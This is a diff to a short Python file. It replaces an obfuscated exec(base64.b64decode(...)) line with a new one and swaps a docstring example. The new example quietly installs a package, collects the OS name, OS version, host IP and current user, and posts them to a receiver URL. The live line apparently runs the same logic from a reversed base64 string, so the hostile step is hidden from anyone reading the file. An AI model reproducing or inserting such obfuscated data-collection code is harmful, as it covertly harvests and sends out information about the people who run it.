@@ -1,16 +1,11 @@
 """
-import socket
-import json
-
-data = {'Hi': 'there'}
-data_string = json.dumps(data)
-data_bytes = data_string.encode('utf-8')
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 8080))
-s.sendall(b'POST / HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nContent-Type: application/json\\r\\nContent-Length: ' + str(len(data_bytes)).encode('utf-8') + b'\\r\\n\\r\\n' + data_bytes)
-s.close()
+import subprocess, sys, socket, platform, os
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests'])
+import requests
+data={'os_name': platform.system(),'os_ver': platform.release(), 'host_ip': socket.gethostbyname(socket.gethostname()), 'user': os.getlogin()}
+try:requests.post('http://0.0.0.0:8080/receiver', json=data)
+except Exception as e:print(e)
 """
 
 import base64
-exec(base64.b64decode(b'=oQKoU2cvx2YuMnCpMXZ0lnYfFGdhRGIrAyJuxlcc5GXyx1JiByKgkyJ40iZ0V3JoUGZvNmbl5SKpMXZ0lnYfFGdhRGKuVGboIHdzByKgcCI6gGdn5WZM1CduVGdu92Quxlcc52bzp2Lu9Wa0F2YpxGcwFGI6UGc5RVL05WZ052bD5GXyxFM4ADO6AjLw4CMuADI6Q3cvhkbcJHXx4SMvAFVUhEIvACVT9EUnIGKsxWYk5WZz5ycKkSKwgDM4ACLnAjLw4CMuAzJogCdjVmbu92YuMnCp0UQFJFVT91SD90UuQXZrN2bzBCLUVkTJ9lRB5Cdlt2YvNHK0V2aj92cuQXZrN2bzBSPgMnCKkyJ40iZ0V3JoUGZvNmbl5yZulmc0N3XhRXYkBSPgMXZ0lnYfFGdhRmCpEGdhRGKzBXb1RmLu92cqBSPgcmbpJHdz9VY0FGZK03JlJXZoR3JgozJph0J7BSPgEGdhRmCK42bzpGI0J3bw1WaKQXZrN2bzBCdy9GctlmC'[::-1]).decode('utf-8'))
+exec(base64.b64decode(b'==QKlhCdulmcwpTZgMXYg42bpRHclNGeFBCdwV2Y4VmCpEGdhRWPu92cqBCLnIXZ2lWZjVmcvADOwgjOw4CMuAjLw8yL6AHd0h2JoQ3cvBnLzR3clVXclJnO5JHdK0XKo4Wan9Gb0V2ZuM3bgozJyV2c1dCIskSKoUWbh5Gdz9Ga0V2ZuQXZrN2bzhSZtFmb5JGdz9Ga0V2ZuQXZrN2bzBiOnAXafR3cvh2JgwSKoU2chVGblJnLtJ3bmRXYsBHI6ciclZ3Xz92JskCKtVGdzl3cu0mcvZGdhxGcgozJl1WYu91cvdye9EGdhRmCzR3clVXclJHI0J3bw1WaKkSXnMHdzVWdxVmcnACLnQXZpVXct0yJgwyJsxWY0NnbpdCIscCcpB3JgwyJt1yJgwSZsJWY0V3YlhXZuMXeztFKsxWYj91ajVGaj5yczV2YvJHciV3cKM3bgwSby9mZ0FGbwBCL0V2aj92cgwyc5NHIsM3clN2byBnY1NHI0J3bw1Wa'[::-1]).decode('utf-8'))
